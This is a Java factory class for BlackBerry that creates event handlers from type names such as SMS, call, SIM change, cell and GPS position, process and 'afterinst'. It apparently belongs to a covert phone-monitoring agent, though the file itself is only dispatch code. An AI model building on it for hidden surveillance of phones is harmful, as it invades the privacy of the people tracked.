package blackberry.event;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;


public class FactoryEvent {
    //#ifdef DEBUG
    private static Debug debug = new Debug("FactoryEvent", DebugLevel.VERBOSE);
    //#endif
    private static final String TAG = "EventFactory"; //$NON-NLS-1$

    public static  Event create(String type, String subtype) {
        Event e = null;
        if ("timer".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            if ("loop".equals(subtype)) {
                e = new EventLoop();
            }else if ("startup".equals(subtype)) {
                e = new EventStartup();
            } else {
                e = new EventTimer();
            }           
        } else if ("date".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventDate();
        } else if ("afterinst".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventAfterinst();
        } else if ("sms".equals(type)) {

            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_SMS");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventSms();
        } else if ("call".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_CALL");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventCall();
        } else if ("connection".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_CONNECTION");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventConnectivity();
        } else if ("process".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_PROCESS");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventProcess();
        } else if ("position cell".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_CELLID");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventCellId();
        } else if ("quota".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_QUOTA");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventQuota();
        } else if ("sim".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_SIM_CHANGE");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventSim();
        } else if ("position gps".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_LOCATION");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventLocation();
        } else if ("ac".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_AC");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventAc();
        } else if ("battery".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_BATTERY");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventBattery();
        } else if ("standby".equals(type)) {
            //#ifdef DEBUG
                debug.trace(" Info: " + "EVENT_STANDBY");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
            e = new EventStandby();
        } else {
            //#ifdef DEBUG
                debug.trace(" Error: " + "Unknown: " + type);//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
        }
        
        if(e!=null){
            e.setSubType(subtype);
            e.enable(true);
        }
        return e;
    }

}
